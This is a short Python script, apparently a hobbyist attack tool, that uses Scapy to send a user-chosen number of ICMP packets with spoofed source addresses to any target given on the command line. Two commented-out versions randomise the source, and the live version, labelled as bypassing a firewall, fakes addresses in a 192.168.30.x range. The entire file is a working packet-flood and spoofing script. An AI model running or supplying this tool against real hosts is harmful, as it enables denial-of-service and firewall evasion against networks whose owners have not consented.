#Simple version
""" 
import sys
from scapy.all import * 

target = str(sys.argv[1])
numPackets = int(sys.argv[2])

for i in range (numPackets):
    packet = IP(src = RandShort(), dst = target)/ICMP()/"whoamI"
    send(packet)
 """


#RandIP() version
""""
import sys
from scapy.all import * 

target = str(sys.argv[1])
numPackets = int(sys.argv[2])

for i in range (numPackets):
    packet = IP(src = RandIP(), dst = target)/ICMP()/"whoamI"
    send(packet)
"""

#Bypassing Firewall Version

import sys
from tabnanny import verbose
from scapy.all import * 

target = str(sys.argv[1])
numPackets = int(sys.argv[2])

print("Sending " + str(numPackets) + " spoofed packets to the address " + target)

for i in range (numPackets):
    packet = IP(src = "192.168.30." + str(random.randint(2, 253)), dst = target)/ICMP()/"whoamI"
    send(packet)

